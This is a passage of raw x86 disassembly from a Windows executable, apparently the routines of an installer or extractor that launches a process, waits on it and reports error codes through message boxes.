  40393a:	0f 85 e7 00 00 00    	jne    0x403a27
  403940:	8b bd 58 fe ff ff    	mov    -0x1a8(%ebp),%edi
  403946:	ba 4d 05 00 00       	mov    $0x54d,%edx
  40394b:	8b f2                	mov    %edx,%esi
  40394d:	3b f2                	cmp    %edx,%esi
  40394f:	0f 84 54 ff ff ff    	je     0x4038a9
  403955:	81 fe 4c 05 00 00    	cmp    $0x54c,%esi
  40395b:	0f 84 48 ff ff ff    	je     0x4038a9
  403961:	85 f6                	test   %esi,%esi
  403963:	0f 84 be 00 00 00    	je     0x403a27
  403969:	33 ff                	xor    %edi,%edi
  40396b:	57                   	push   %edi
  40396c:	6a 10                	push   $0x10
  40396e:	57                   	push   %edi
  40396f:	57                   	push   %edi
  403970:	e9 a9 00 00 00       	jmp    0x403a1e
  403975:	8b 8d 4c fe ff ff    	mov    -0x1b4(%ebp),%ecx
  40397b:	85 c9                	test   %ecx,%ecx
  40397d:	74 2a                	je     0x4039a9
  40397f:	8b 79 34             	mov    0x34(%ecx),%edi
  403982:	8b 41 30             	mov    0x30(%ecx),%eax
  403985:	81 c7 84 00 00 00    	add    $0x84,%edi
  40398b:	03 fa                	add    %edx,%edi
  40398d:	a8 01                	test   $0x1,%al
  40398f:	74 07                	je     0x403998
  403991:	bb 04 01 00 00       	mov    $0x104,%ebx
  403996:	eb 17                	jmp    0x4039af
  403998:	24 02                	and    $0x2,%al
  40399a:	0f b6 d8             	movzbl %al,%ebx
  40399d:	f7 db                	neg    %ebx
  40399f:	1b db                	sbb    %ebx,%ebx
  4039a1:	81 e3 01 01 00 00    	and    $0x101,%ebx
  4039a7:	eb 06                	jmp    0x4039af
  4039a9:	8b bd 50 fe ff ff    	mov    -0x1b0(%ebp),%edi
  4039af:	f6 05 38 8a 40 00 01 	testb  $0x1,0x408a38
  4039b6:	75 57                	jne    0x403a0f
  4039b8:	85 ff                	test   %edi,%edi
  4039ba:	74 53                	je     0x403a0f
  4039bc:	80 3f 00             	cmpb   $0x0,(%edi)
  4039bf:	74 4e                	je     0x403a0f
  4039c1:	6a 00                	push   $0x0
  4039c3:	ff 15 dc a1 40 00    	call   *0x40a1dc
  4039c9:	e8 51 2e 00 00       	call   0x40681f
  4039ce:	85 c0                	test   %eax,%eax
  4039d0:	74 11                	je     0x4039e3
  4039d2:	51                   	push   %ecx
  4039d3:	e8 f1 2d 00 00       	call   0x4067c9
  4039d8:	85 c0                	test   %eax,%eax
  4039da:	74 07                	je     0x4039e3
  4039dc:	b8 30 00 18 00       	mov    $0x180030,%eax
  4039e1:	eb 03                	jmp    0x4039e6
  4039e3:	6a 30                	push   $0x30
  4039e5:	58                   	pop    %eax
  4039e6:	0b c3                	or     %ebx,%eax
  4039e8:	50                   	push   %eax
  4039e9:	68 54 91 40 00       	push   $0x409154
  4039ee:	57                   	push   %edi
  4039ef:	6a 00                	push   $0x0
  4039f1:	ff 15 0c a2 40 00    	call   *0x40a20c
  4039f7:	f6 c3 04             	test   $0x4,%bl
  4039fa:	74 05                	je     0x403a01
  4039fc:	83 f8 06             	cmp    $0x6,%eax
  4039ff:	eb 08                	jmp    0x403a09
  403a01:	f6 c3 01             	test   $0x1,%bl
  403a04:	74 21                	je     0x403a27
  403a06:	83 f8 01             	cmp    $0x1,%eax
  403a09:	75 1c                	jne    0x403a27
  403a0b:	33 f6                	xor    %esi,%esi
  403a0d:	eb 18                	jmp    0x403a27
  403a0f:	6a 00                	push   $0x0
  403a11:	6a 30                	push   $0x30
  403a13:	ff b5 60 fe ff ff    	push   -0x1a0(%ebp)
  403a19:	68 54 91 40 00       	push   $0x409154
  403a1e:	8b d6                	mov    %esi,%edx
  403a20:	33 c9                	xor    %ecx,%ecx
  403a22:	e8 92 0a 00 00       	call   0x4044b9
  403a27:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403a2a:	33 c0                	xor    %eax,%eax
  403a2c:	85 f6                	test   %esi,%esi
  403a2e:	5f                   	pop    %edi
  403a2f:	0f 94 c0             	sete   %al
  403a32:	33 cd                	xor    %ebp,%ecx
  403a34:	5e                   	pop    %esi
  403a35:	5b                   	pop    %ebx
  403a36:	e8 a5 32 00 00       	call   0x406ce0
  403a3b:	8b e5                	mov    %ebp,%esp
  403a3d:	5d                   	pop    %ebp
  403a3e:	c3                   	ret
  403a3f:	8b ff                	mov    %edi,%edi
  403a41:	53                   	push   %ebx
  403a42:	56                   	push   %esi
  403a43:	57                   	push   %edi
  403a44:	33 ff                	xor    %edi,%edi
  403a46:	bb b8 12 40 00       	mov    $0x4012b8,%ebx
  403a4b:	57                   	push   %edi
  403a4c:	33 d2                	xor    %edx,%edx
  403a4e:	8b cb                	mov    %ebx,%ecx
  403a50:	e8 3a 0c 00 00       	call   0x40468f
  403a55:	8b f0                	mov    %eax,%esi
  403a57:	8d 4e 01             	lea    0x1(%esi),%ecx
  403a5a:	51                   	push   %ecx
  403a5b:	6a 40                	push   $0x40
  403a5d:	ff 15 50 a1 40 00    	call   *0x40a150
  403a63:	a3 4c 8d 40 00       	mov    %eax,0x408d4c
  403a68:	85 c0                	test   %eax,%eax
  403a6a:	75 22                	jne    0x403a8e
  403a6c:	57                   	push   %edi
  403a6d:	6a 10                	push   $0x10
  403a6f:	57                   	push   %edi
  403a70:	57                   	push   %edi
  403a71:	ba b5 04 00 00       	mov    $0x4b5,%edx
  403a76:	33 c9                	xor    %ecx,%ecx
  403a78:	e8 3c 0a 00 00       	call   0x4044b9
  403a7d:	e8 03 28 00 00       	call   0x406285
  403a82:	a3 24 91 40 00       	mov    %eax,0x409124
  403a87:	33 c0                	xor    %eax,%eax
  403a89:	e9 94 00 00 00       	jmp    0x403b22
  403a8e:	56                   	push   %esi
  403a8f:	8b d0                	mov    %eax,%edx
  403a91:	8b cb                	mov    %ebx,%ecx
  403a93:	e8 f7 0b 00 00       	call   0x40468f
  403a98:	85 c0                	test   %eax,%eax
  403a9a:	75 29                	jne    0x403ac5
  403a9c:	57                   	push   %edi
  403a9d:	6a 10                	push   $0x10
  403a9f:	57                   	push   %edi
  403aa0:	57                   	push   %edi
  403aa1:	ba b1 04 00 00       	mov    $0x4b1,%edx
  403aa6:	33 c9                	xor    %ecx,%ecx
  403aa8:	e8 0c 0a 00 00       	call   0x4044b9
  403aad:	ff 35 4c 8d 40 00    	push   0x408d4c
  403ab3:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403ab9:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  403ac0:	07 07 80 
  403ac3:	eb c2                	jmp    0x403a87
  403ac5:	68 c0 12 40 00       	push   $0x4012c0
  403aca:	ff 35 4c 8d 40 00    	push   0x408d4c
  403ad0:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  403ad6:	85 c0                	test   %eax,%eax
  403ad8:	74 33                	je     0x403b0d
  403ada:	57                   	push   %edi
  403adb:	57                   	push   %edi
  403adc:	68 00 31 40 00       	push   $0x403100
  403ae1:	57                   	push   %edi
  403ae2:	ba d1 07 00 00       	mov    $0x7d1,%edx
  403ae7:	e8 2b 2a 00 00       	call   0x406517
  403aec:	ff 35 4c 8d 40 00    	push   0x408d4c
  403af2:	8b f0                	mov    %eax,%esi
  403af4:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403afa:	85 f6                	test   %esi,%esi
  403afc:	75 1b                	jne    0x403b19
  403afe:	c7 05 24 91 40 00 c7 	movl   $0x800704c7,0x409124
  403b05:	04 07 80 
  403b08:	e9 7a ff ff ff       	jmp    0x403a87
  403b0d:	ff 35 4c 8d 40 00    	push   0x408d4c
  403b13:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403b19:	33 c0                	xor    %eax,%eax
  403b1b:	89 3d 24 91 40 00    	mov    %edi,0x409124
  403b21:	40                   	inc    %eax
  403b22:	5f                   	pop    %edi
  403b23:	5e                   	pop    %esi
  403b24:	5b                   	pop    %ebx
  403b25:	c3                   	ret
  403b26:	8b ff                	mov    %edi,%edi
  403b28:	56                   	push   %esi
  403b29:	33 f6                	xor    %esi,%esi
  403b2b:	8b c6                	mov    %esi,%eax
  403b2d:	c7 80 60 8d 40 00 01 	movl   $0x1,0x408d60(%eax)
  403b34:	00 00 00 
  403b37:	83 c0 18             	add    $0x18,%eax
  403b3a:	3d c0 03 00 00       	cmp    $0x3c0,%eax
  403b3f:	72 ec                	jb     0x403b2d
  403b41:	f6 05 38 8a 40 00 01 	testb  $0x1,0x408a38
  403b48:	75 28                	jne    0x403b72
  403b4a:	f6 05 34 9a 40 00 01 	testb  $0x1,0x409a34
  403b51:	75 1f                	jne    0x403b72
  403b53:	8b 15 84 81 40 00    	mov    0x408184,%edx
  403b59:	56                   	push   %esi
  403b5a:	f7 da                	neg    %edx
  403b5c:	56                   	push   %esi
  403b5d:	68 f0 34 40 00       	push   $0x4034f0
  403b62:	1b d2                	sbb    %edx,%edx
  403b64:	56                   	push   %esi
  403b65:	81 c2 d5 07 00 00    	add    $0x7d5,%edx
  403b6b:	e8 a7 29 00 00       	call   0x406517
  403b70:	eb 05                	jmp    0x403b77
  403b72:	e8 69 14 00 00       	call   0x404fe0
  403b77:	85 c0                	test   %eax,%eax
  403b79:	75 0e                	jne    0x403b89
  403b7b:	c7 05 24 91 40 00 2b 	movl   $0x8007042b,0x409124
  403b82:	04 07 80 
  403b85:	33 c0                	xor    %eax,%eax
  403b87:	5e                   	pop    %esi
  403b88:	c3                   	ret
  403b89:	b9 c0 63 40 00       	mov    $0x4063c0,%ecx
  403b8e:	e8 05 27 00 00       	call   0x406298
  403b93:	85 c0                	test   %eax,%eax
  403b95:	74 ee                	je     0x403b85
  403b97:	33 c0                	xor    %eax,%eax
  403b99:	89 35 24 91 40 00    	mov    %esi,0x409124
  403b9f:	40                   	inc    %eax
  403ba0:	5e                   	pop    %esi
  403ba1:	c3                   	ret
  403ba2:	8b ff                	mov    %edi,%edi
  403ba4:	55                   	push   %ebp
  403ba5:	8b ec                	mov    %esp,%ebp
  403ba7:	83 e4 f8             	and    $0xfffffff8,%esp
  403baa:	81 ec 94 01 00 00    	sub    $0x194,%esp
  403bb0:	a1 04 80 40 00       	mov    0x408004,%eax
  403bb5:	33 c4                	xor    %esp,%eax
  403bb7:	89 84 24 90 01 00 00 	mov    %eax,0x190(%esp)
  403bbe:	53                   	push   %ebx
  403bbf:	56                   	push   %esi
  403bc0:	33 f6                	xor    %esi,%esi
  403bc2:	21 35 24 91 40 00    	and    %esi,0x409124
  403bc8:	57                   	push   %edi
  403bc9:	33 ff                	xor    %edi,%edi
  403bcb:	89 74 24 20          	mov    %esi,0x20(%esp)
  403bcf:	89 7c 24 24          	mov    %edi,0x24(%esp)
  403bd3:	39 35 28 8a 40 00    	cmp    %esi,0x408a28
  403bd9:	75 22                	jne    0x403bfd
  403bdb:	6a 04                	push   $0x4
  403bdd:	ba 2c 9a 40 00       	mov    $0x409a2c,%edx
  403be2:	b9 c8 12 40 00       	mov    $0x4012c8,%ecx
  403be7:	e8 a3 0a 00 00       	call   0x40468f
  403bec:	85 c0                	test   %eax,%eax
  403bee:	0f 84 1f 01 00 00    	je     0x403d13
  403bf4:	83 f8 04             	cmp    $0x4,%eax
  403bf7:	0f 87 16 01 00 00    	ja     0x403d13
  403bfd:	33 db                	xor    %ebx,%ebx
  403bff:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  403c03:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
  403c08:	8d 44 24 48          	lea    0x48(%esp),%eax
  403c0c:	6a 44                	push   $0x44
  403c0e:	6a 00                	push   $0x0
  403c10:	50                   	push   %eax
  403c11:	e8 99 36 00 00       	call   0x4072af
  403c16:	83 c4 0c             	add    $0xc,%esp
  403c19:	c7 44 24 48 44 00 00 	movl   $0x44,0x48(%esp)
  403c20:	00 
  403c21:	80 3d 42 8c 40 00 00 	cmpb   $0x0,0x408c42
  403c28:	0f 85 07 01 00 00    	jne    0x403d35
  403c2e:	6a 04                	push   $0x4
  403c30:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  403c34:	b9 d0 12 40 00       	mov    $0x4012d0,%ecx
  403c39:	e8 51 0a 00 00       	call   0x40468f
  403c3e:	85 c0                	test   %eax,%eax
  403c40:	0f 84 cd 00 00 00    	je     0x403d13
  403c46:	83 f8 04             	cmp    $0x4,%eax
  403c49:	0f 87 c4 00 00 00    	ja     0x403d13
  403c4f:	33 c0                	xor    %eax,%eax
  403c51:	40                   	inc    %eax
  403c52:	39 44 24 18          	cmp    %eax,0x18(%esp)
  403c56:	75 08                	jne    0x403c60
  403c58:	89 44 24 74          	mov    %eax,0x74(%esp)
  403c5c:	33 c0                	xor    %eax,%eax
  403c5e:	eb 0e                	jmp    0x403c6e
  403c60:	83 7c 24 18 02       	cmpl   $0x2,0x18(%esp)
  403c65:	75 0e                	jne    0x403c75
  403c67:	6a 06                	push   $0x6
  403c69:	89 44 24 78          	mov    %eax,0x78(%esp)
  403c6d:	58                   	pop    %eax
  403c6e:	66 89 44 24 78       	mov    %ax,0x78(%esp)
  403c73:	eb 12                	jmp    0x403c87
  403c75:	6a 03                	push   $0x3
  403c77:	59                   	pop    %ecx
  403c78:	39 4c 24 18          	cmp    %ecx,0x18(%esp)
  403c7c:	75 09                	jne    0x403c87
  403c7e:	89 44 24 74          	mov    %eax,0x74(%esp)
  403c82:	66 89 4c 24 78       	mov    %cx,0x78(%esp)
  403c87:	85 db                	test   %ebx,%ebx
  403c89:	0f 85 be 00 00 00    	jne    0x403d4d
  403c8f:	66 a1 38 8a 40 00    	mov    0x408a38,%ax
  403c95:	66 85 c0             	test   %ax,%ax
  403c98:	74 57                	je     0x403cf1
  403c9a:	a8 01                	test   $0x1,%al
  403c9c:	74 07                	je     0x403ca5
  403c9e:	b9 dc 12 40 00       	mov    $0x4012dc,%ecx
  403ca3:	eb 0d                	jmp    0x403cb2
  403ca5:	a8 02                	test   $0x2,%al
  403ca7:	0f 84 a0 02 00 00    	je     0x403f4d
  403cad:	b9 e4 12 40 00       	mov    $0x4012e4,%ecx
  403cb2:	68 04 01 00 00       	push   $0x104
  403cb7:	8d 94 24 94 00 00 00 	lea    0x94(%esp),%edx
  403cbe:	e8 cc 09 00 00       	call   0x40468f
  403cc3:	85 c0                	test   %eax,%eax
  403cc5:	74 4c                	je     0x403d13
  403cc7:	6a ff                	push   $0xffffffff
  403cc9:	68 c0 12 40 00       	push   $0x4012c0
  403cce:	6a ff                	push   $0xffffffff
  403cd0:	8d 84 24 9c 00 00 00 	lea    0x9c(%esp),%eax
  403cd7:	50                   	push   %eax
  403cd8:	6a 01                	push   $0x1
  403cda:	6a 7f                	push   $0x7f
  403cdc:	ff 15 68 a0 40 00    	call   *0x40a068
  403ce2:	83 e8 02             	sub    $0x2,%eax
  403ce5:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403ce8:	74 07                	je     0x403cf1
  403cea:	33 f6                	xor    %esi,%esi
  403cec:	46                   	inc    %esi
  403ced:	89 74 24 20          	mov    %esi,0x20(%esp)
  403cf1:	85 f6                	test   %esi,%esi
  403cf3:	0f 85 a5 00 00 00    	jne    0x403d9e
  403cf9:	68 04 01 00 00       	push   $0x104
  403cfe:	8d 94 24 94 00 00 00 	lea    0x94(%esp),%edx
  403d05:	b9 ec 12 40 00       	mov    $0x4012ec,%ecx
  403d0a:	e8 80 09 00 00       	call   0x40468f
  403d0f:	85 c0                	test   %eax,%eax
  403d11:	75 3a                	jne    0x403d4d
  403d13:	33 c0                	xor    %eax,%eax
  403d15:	ba b1 04 00 00       	mov    $0x4b1,%edx
  403d1a:	50                   	push   %eax
  403d1b:	6a 10                	push   $0x10
  403d1d:	50                   	push   %eax
  403d1e:	50                   	push   %eax
  403d1f:	33 c9                	xor    %ecx,%ecx
  403d21:	e8 93 07 00 00       	call   0x4044b9
  403d26:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  403d2d:	07 07 80 
  403d30:	e9 18 02 00 00       	jmp    0x403f4d
  403d35:	51                   	push   %ecx
  403d36:	68 42 8c 40 00       	push   $0x408c42
  403d3b:	51                   	push   %ecx
  403d3c:	ba 04 01 00 00       	mov    $0x104,%edx
  403d41:	8d 8c 24 9c 00 00 00 	lea    0x9c(%esp),%ecx
  403d48:	e8 34 da ff ff       	call   0x401781
  403d4d:	33 f6                	xor    %esi,%esi
  403d4f:	46                   	inc    %esi
  403d50:	3b de                	cmp    %esi,%ebx
  403d52:	75 4a                	jne    0x403d9e
  403d54:	68 04 01 00 00       	push   $0x104
  403d59:	8d 94 24 94 00 00 00 	lea    0x94(%esp),%edx
  403d60:	b9 f8 12 40 00       	mov    $0x4012f8,%ecx
  403d65:	e8 25 09 00 00       	call   0x40468f
  403d6a:	85 c0                	test   %eax,%eax
  403d6c:	74 a5                	je     0x403d13
  403d6e:	80 3d 42 8c 40 00 00 	cmpb   $0x0,0x408c42
  403d75:	0f 85 5f 02 00 00    	jne    0x403fda
  403d7b:	6a ff                	push   $0xffffffff
  403d7d:	68 c0 12 40 00       	push   $0x4012c0
  403d82:	6a ff                	push   $0xffffffff
  403d84:	8d 84 24 9c 00 00 00 	lea    0x9c(%esp),%eax
  403d8b:	50                   	push   %eax
  403d8c:	56                   	push   %esi
  403d8d:	6a 7f                	push   $0x7f
  403d8f:	ff 15 68 a0 40 00    	call   *0x40a068
  403d95:	48                   	dec    %eax
  403d96:	2b c6                	sub    %esi,%eax
  403d98:	0f 84 3c 02 00 00    	je     0x403fda
  403d9e:	8d 44 24 14          	lea    0x14(%esp),%eax
  403da2:	50                   	push   %eax
  403da3:	8d 44 24 14          	lea    0x14(%esp),%eax
  403da7:	50                   	push   %eax
  403da8:	8d 8c 24 98 00 00 00 	lea    0x98(%esp),%ecx
  403daf:	e8 34 dd ff ff       	call   0x401ae8
  403db4:	85 c0                	test   %eax,%eax
  403db6:	0f 84 91 01 00 00    	je     0x403f4d
  403dbc:	8b 74 24 14          	mov    0x14(%esp),%esi
  403dc0:	85 ff                	test   %edi,%edi
  403dc2:	75 22                	jne    0x403de6
  403dc4:	33 c0                	xor    %eax,%eax
  403dc6:	40                   	inc    %eax
  403dc7:	66 39 05 40 9a 40 00 	cmp    %ax,0x409a40
  403dce:	74 16                	je     0x403de6
  403dd0:	83 3d 20 8a 40 00 00 	cmpl   $0x0,0x408a20
  403dd7:	74 0d                	je     0x403de6
  403dd9:	85 f6                	test   %esi,%esi
  403ddb:	75 11                	jne    0x403dee
  403ddd:	89 44 24 24          	mov    %eax,0x24(%esp)
  403de1:	e8 44 e2 ff ff       	call   0x40202a
  403de6:	85 f6                	test   %esi,%esi
  403de8:	0f 84 1d 01 00 00    	je     0x403f0b
  403dee:	83 3d 80 81 40 00 00 	cmpl   $0x0,0x408180
  403df5:	0f 84 b0 01 00 00    	je     0x403fab
  403dfb:	85 f6                	test   %esi,%esi
  403dfd:	0f 84 08 01 00 00    	je     0x403f0b
  403e03:	f6 05 34 9a 40 00 04 	testb  $0x4,0x409a34
  403e0a:	0f 84 fb 00 00 00    	je     0x403f0b
  403e10:	e8 80 26 00 00       	call   0x406495
  403e15:	8b d8                	mov    %eax,%ebx
  403e17:	85 db                	test   %ebx,%ebx
  403e19:	0f 84 73 01 00 00    	je     0x403f92
  403e1f:	be 94 81 40 00       	mov    $0x408194,%esi
  403e24:	56                   	push   %esi
  403e25:	53                   	push   %ebx
  403e26:	ff 15 9c a0 40 00    	call   *0x40a09c
  403e2c:	8b d0                	mov    %eax,%edx
  403e2e:	33 c0                	xor    %eax,%eax
  403e30:	89 54 24 14          	mov    %edx,0x14(%esp)
  403e34:	85 d2                	test   %edx,%edx
  403e36:	0f 84 28 01 00 00    	je     0x403f64
  403e3c:	83 3d 30 8a 40 00 00 	cmpl   $0x0,0x408a30
  403e43:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403e47:	89 44 24 28          	mov    %eax,0x28(%esp)
  403e4b:	8d 84 24 90 00 00 00 	lea    0x90(%esp),%eax
  403e52:	89 44 24 38          	mov    %eax,0x38(%esp)
  403e56:	66 a1 40 9a 40 00    	mov    0x409a40,%ax
  403e5c:	66 89 44 24 3c       	mov    %ax,0x3c(%esp)
  403e61:	0f b7 05 38 8a 40 00 	movzwl 0x408a38,%eax
  403e68:	c7 44 24 2c 54 91 40 	movl   $0x409154,0x2c(%esp)
  403e6f:	00 
  403e70:	89 7c 24 30          	mov    %edi,0x30(%esp)
  403e74:	c7 44 24 34 e4 91 40 	movl   $0x4091e4,0x34(%esp)
  403e7b:	00 
  403e7c:	89 44 24 40          	mov    %eax,0x40(%esp)
  403e80:	74 09                	je     0x403e8b
  403e82:	0d 00 00 01 00       	or     $0x10000,%eax
  403e87:	89 44 24 40          	mov    %eax,0x40(%esp)
  403e8b:	8b 0d 34 9a 40 00    	mov    0x409a34,%ecx
  403e91:	f6 c1 08             	test   $0x8,%cl
  403e94:	74 09                	je     0x403e9f
  403e96:	0d 00 00 02 00       	or     $0x20000,%eax
  403e9b:	89 44 24 40          	mov    %eax,0x40(%esp)
  403e9f:	f6 c1 10             	test   $0x10,%cl
  403ea2:	74 09                	je     0x403ead
  403ea4:	0d 00 00 04 00       	or     $0x40000,%eax
  403ea9:	89 44 24 40          	mov    %eax,0x40(%esp)
  403ead:	8b 0d 48 8d 40 00    	mov    0x408d48,%ecx
  403eb3:	f6 c1 40             	test   $0x40,%cl
  403eb6:	74 09                	je     0x403ec1
  403eb8:	0d 00 00 08 00       	or     $0x80000,%eax
  403ebd:	89 44 24 40          	mov    %eax,0x40(%esp)
  403ec1:	84 c9                	test   %cl,%cl
  403ec3:	79 09                	jns    0x403ece
  403ec5:	0d 00 00 10 00       	or     $0x100000,%eax
  403eca:	89 44 24 40          	mov    %eax,0x40(%esp)
  403ece:	a1 38 9a 40 00       	mov    0x409a38,%eax
  403ed3:	8b f4                	mov    %esp,%esi
  403ed5:	89 44 24 44          	mov    %eax,0x44(%esp)
  403ed9:	8b ca                	mov    %edx,%ecx
  403edb:	8d 44 24 28          	lea    0x28(%esp),%eax
  403edf:	50                   	push   %eax
  403ee0:	ff 15 88 a2 40 00    	call   *0x40a288
  403ee6:	ff 54 24 18          	call   *0x18(%esp)
  403eea:	3b f4                	cmp    %esp,%esi
  403eec:	74 07                	je     0x403ef5
  403eee:	b9 04 00 00 00       	mov    $0x4,%ecx
  403ef3:	cd 29                	int    $0x29
  403ef5:	a3 24 91 40 00       	mov    %eax,0x409124
  403efa:	53                   	push   %ebx
  403efb:	85 c0                	test   %eax,%eax
  403efd:	78 41                	js     0x403f40
  403eff:	ff 15 ac a0 40 00    	call   *0x40a0ac
  403f05:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403f09:	eb 13                	jmp    0x403f1e
  403f0b:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403f0f:	8d 54 24 48          	lea    0x48(%esp),%edx
  403f13:	8b cf                	mov    %edi,%ecx
  403f15:	e8 d5 00 00 00       	call   0x403fef
  403f1a:	85 c0                	test   %eax,%eax
  403f1c:	74 28                	je     0x403f46
  403f1e:	57                   	push   %edi
  403f1f:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403f25:	43                   	inc    %ebx
  403f26:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  403f2a:	83 fb 02             	cmp    $0x2,%ebx
  403f2d:	0f 83 a4 00 00 00    	jae    0x403fd7
  403f33:	8b 74 24 20          	mov    0x20(%esp),%esi
  403f37:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403f3b:	e9 c3 fc ff ff       	jmp    0x403c03
  403f40:	ff 15 ac a0 40 00    	call   *0x40a0ac
  403f46:	57                   	push   %edi
  403f47:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403f4d:	33 c0                	xor    %eax,%eax
  403f4f:	8b 8c 24 9c 01 00 00 	mov    0x19c(%esp),%ecx
  403f56:	5f                   	pop    %edi
  403f57:	5e                   	pop    %esi
  403f58:	5b                   	pop    %ebx
  403f59:	33 cc                	xor    %esp,%ecx
  403f5b:	e8 80 2d 00 00       	call   0x406ce0
  403f60:	8b e5                	mov    %ebp,%esp
  403f62:	5d                   	pop    %ebp
  403f63:	c3                   	ret
  403f64:	50                   	push   %eax
  403f65:	6a 10                	push   $0x10
  403f67:	50                   	push   %eax
  403f68:	56                   	push   %esi
  403f69:	ba c9 04 00 00       	mov    $0x4c9,%edx
  403f6e:	33 c9                	xor    %ecx,%ecx
  403f70:	e8 44 05 00 00       	call   0x4044b9
  403f75:	53                   	push   %ebx
  403f76:	ff 15 ac a0 40 00    	call   *0x40a0ac
  403f7c:	ff 74 24 10          	push   0x10(%esp)
  403f80:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403f86:	e8 fa 22 00 00       	call   0x406285
  403f8b:	a3 24 91 40 00       	mov    %eax,0x409124
  403f90:	eb bb                	jmp    0x403f4d
  403f92:	33 c0                	xor    %eax,%eax
  403f94:	ba c8 04 00 00       	mov    $0x4c8,%edx
  403f99:	50                   	push   %eax
  403f9a:	6a 10                	push   $0x10
  403f9c:	50                   	push   %eax
  403f9d:	68 d8 11 40 00       	push   $0x4011d8
  403fa2:	33 c9                	xor    %ecx,%ecx
  403fa4:	e8 10 05 00 00       	call   0x4044b9
  403fa9:	eb d1                	jmp    0x403f7c
  403fab:	33 c0                	xor    %eax,%eax
  403fad:	ba c7 04 00 00       	mov    $0x4c7,%edx
  403fb2:	50                   	push   %eax
  403fb3:	6a 10                	push   $0x10
  403fb5:	50                   	push   %eax
  403fb6:	50                   	push   %eax
  403fb7:	33 c9                	xor    %ecx,%ecx
  403fb9:	e8 fb 04 00 00       	call   0x4044b9
  403fbe:	ff 74 24 10          	push   0x10(%esp)
  403fc2:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  403fc8:	c7 05 24 91 40 00 2b 	movl   $0x8007042b,0x409124
  403fcf:	04 07 80 
  403fd2:	e9 76 ff ff ff       	jmp    0x403f4d
  403fd7:	33 f6                	xor    %esi,%esi
  403fd9:	46                   	inc    %esi
  403fda:	83 3d 80 85 40 00 00 	cmpl   $0x0,0x408580
  403fe1:	74 05                	je     0x403fe8
  403fe3:	e8 7f e2 ff ff       	call   0x402267
  403fe8:	8b c6                	mov    %esi,%eax
  403fea:	e9 60 ff ff ff       	jmp    0x403f4f
  403fef:	8b ff                	mov    %edi,%edi
  403ff1:	55                   	push   %ebp
  403ff2:	8b ec                	mov    %esp,%ebp
  403ff4:	81 ec 1c 02 00 00    	sub    $0x21c,%esp
  403ffa:	a1 04 80 40 00       	mov    0x408004,%eax
  403fff:	33 c5                	xor    %ebp,%eax
  404001:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404004:	53                   	push   %ebx
  404005:	56                   	push   %esi
  404006:	33 f6                	xor    %esi,%esi
  404008:	8b d9                	mov    %ecx,%ebx
  40400a:	46                   	inc    %esi
  40400b:	33 c0                	xor    %eax,%eax
  40400d:	57                   	push   %edi
  40400e:	85 db                	test   %ebx,%ebx
  404010:	0f 84 f4 00 00 00    	je     0x40410a
  404016:	8d bd e4 fd ff ff    	lea    -0x21c(%ebp),%edi
  40401c:	ab                   	stos   %eax,%es:(%edi)
  40401d:	ab                   	stos   %eax,%es:(%edi)
  40401e:	ab                   	stos   %eax,%es:(%edi)
  40401f:	ab                   	stos   %eax,%es:(%edi)
  404020:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  404026:	50                   	push   %eax
  404027:	52                   	push   %edx
  404028:	33 ff                	xor    %edi,%edi
  40402a:	57                   	push   %edi
  40402b:	57                   	push   %edi
  40402c:	6a 20                	push   $0x20
  40402e:	57                   	push   %edi
  40402f:	57                   	push   %edi
  404030:	57                   	push   %edi
  404031:	53                   	push   %ebx
  404032:	57                   	push   %edi
  404033:	ff 15 34 a1 40 00    	call   *0x40a134
  404039:	85 c0                	test   %eax,%eax
  40403b:	0f 84 83 00 00 00    	je     0x4040c4
  404041:	6a ff                	push   $0xffffffff
  404043:	ff b5 e4 fd ff ff    	push   -0x21c(%ebp)
  404049:	ff 15 98 a1 40 00    	call   *0x40a198
  40404f:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  404055:	50                   	push   %eax
  404056:	ff b5 e4 fd ff ff    	push   -0x21c(%ebp)
  40405c:	ff 15 48 a1 40 00    	call   *0x40a148
  404062:	8b 8d f4 fd ff ff    	mov    -0x20c(%ebp),%ecx
  404068:	39 3d 28 8a 40 00    	cmp    %edi,0x408a28
  40406e:	75 21                	jne    0x404091
  404070:	a1 2c 9a 40 00       	mov    0x409a2c,%eax
  404075:	a8 01                	test   $0x1,%al
  404077:	74 18                	je     0x404091
  404079:	a8 02                	test   $0x2,%al
  40407b:	75 14                	jne    0x404091
  40407d:	8b c1                	mov    %ecx,%eax
  40407f:	25 00 00 00 ff       	and    $0xff000000,%eax
  404084:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
  404089:	75 06                	jne    0x404091
  40408b:	89 0d 2c 9a 40 00    	mov    %ecx,0x409a2c
  404091:	e8 85 00 00 00       	call   0x40411b
  404096:	ff b5 e8 fd ff ff    	push   -0x218(%ebp)
  40409c:	ff 15 88 a0 40 00    	call   *0x40a088
  4040a2:	ff b5 e4 fd ff ff    	push   -0x21c(%ebp)
  4040a8:	ff 15 88 a0 40 00    	call   *0x40a088
  4040ae:	f7 05 34 9a 40 00 00 	testl  $0x400,0x409a34
  4040b5:	04 00 00 
  4040b8:	74 4e                	je     0x404108
  4040ba:	39 bd f4 fd ff ff    	cmp    %edi,-0x20c(%ebp)
  4040c0:	7d 46                	jge    0x404108
  4040c2:	eb 42                	jmp    0x404106
  4040c4:	e8 bc 21 00 00       	call   0x406285
  4040c9:	57                   	push   %edi
  4040ca:	a3 24 91 40 00       	mov    %eax,0x409124
